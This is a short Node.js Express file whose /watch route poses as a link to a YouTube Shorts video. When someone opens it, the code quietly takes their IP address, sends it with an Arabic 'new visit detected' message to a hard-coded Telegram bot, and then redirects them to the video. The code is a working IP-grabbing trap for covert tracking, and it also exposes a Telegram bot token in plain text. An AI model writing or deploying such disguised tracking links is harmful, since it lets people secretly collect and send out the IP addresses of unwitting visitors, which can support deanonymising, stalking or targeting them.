const express = require('express');
const app = express();

const TELEGRAM_TOKEN = '8497652334:AAFF0E0w2b11XSzs48a6Nq3EbhObocc8hkU';
const CHAT_ID = '6630829302';

app.get('/watch', async (req, res) => {
    try {
        const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const message = `🎯 تم رصيد زيارة جديدة!\n🌐 الـ IP: ${visitorIp}`;
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        await fetch(telegramUrl);
    } catch (error) {
        console.error('Error:', error);
    }
    
    res.redirect('https://youtube.com/shorts/bN9h2oRnLB4?si=kXhF5Q_P-ER2yazA_ID');
});

module.exports = app;
